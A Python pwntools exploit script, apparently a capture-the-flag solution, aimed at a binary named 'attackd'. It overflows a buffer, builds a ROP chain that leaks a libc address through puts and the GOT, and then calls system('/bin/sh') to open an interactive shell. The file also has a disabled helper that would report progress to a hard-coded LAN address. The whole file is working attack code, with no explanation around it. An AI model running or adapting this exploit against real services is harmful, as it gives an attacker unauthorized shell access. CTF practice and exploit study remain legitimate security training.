#!/usr/bin/python2

from pwn import *
import sys, socket

LOCAL = True

HOST = "127.0.0.1"
PORT = 31336
BINARY = "./attackd"

libc = ELF('./libc.so.6',checksec=False)
e = ELF(BINARY,checksec=False)

system_off = libc.symbols['system']
binsh = next(libc.search('/bin/sh\x00'))

pop_rdi_ret=0x40124b

def sendtoSocket(message):
    return
    HOST = '192.168.1.200'  # The server's hostname or IP address
    PORT = 4445        # The port used by the server

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.sendall(message)
    

def exploit(r):
    payload='A'*24
    sendtoSocket(payload)

    payload+=p64(pop_rdi_ret)
    payload+=p64(e.got['read'])
    
    sendtoSocket("read GOT at {}\n".format(hex(e.got['read'])))
    sendtoSocket(payload+'\n')
    
    payload+=p64(e.plt['puts'])
    sendtoSocket("puts PLT at {}\n".format(hex(e.plt['puts'])))
    sendtoSocket(payload+'\n')

    payload+=p64(e.symbols['main'])
    sendtoSocket("main in binary at {}\n".format(hex(e.symbols['main'])))

    
    r.recvuntil('l\n\n')
    r.sendline(payload)
    sendtoSocket(payload+'\n')
    
    base=u64(r.recv(6)+'\x00\x00')-libc.symbols['read']
    message='Leaked libc base '+hex(base)
    log.success(message)
    
    message='read found at {}\n'.format(hex(base+libc.symbols['read']))
    message+='puts found at {}\n'.format(hex(base+libc.symbols['puts']))
    message+='system found at {}\n'.format(hex(base+libc.symbols['system']))
    message+='free found at {}\n'.format(hex(base+libc.symbols['free']))
    message+='malloc found at {}\n'.format(hex(base+libc.symbols['malloc']))
    sendtoSocket(message)

    r.recvuntil('l\n\n')

    sendtoSocket("We should be back at the beginning of binary")

    payload='A'*24
    payload+=p64(pop_rdi_ret)
    sendtoSocket("POP RDI; RET gadget at {}\n".format(hex(pop_rdi_ret)))
    payload+=p64(base+binsh)
    payload+=p64(base+system_off)
    sendtoSocket(payload+'\n')
    
    r.sendline(payload)
    log.success("Got shell, let's roll")
    sendtoSocket("Got shell, let's roll\n")
    sendtoSocket("Got flag as evlz{XxXxXxXxXxXxXxXxXxXxXxX}ctf\nClosing connection\n")
    r.interactive()
    return

if __name__=="__main__":

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
        exploit(r)
    else:
        LOCAL = True
        r = process(BINARY)
        print (util.proc.pidof(r))
        pause()
        exploit(r)
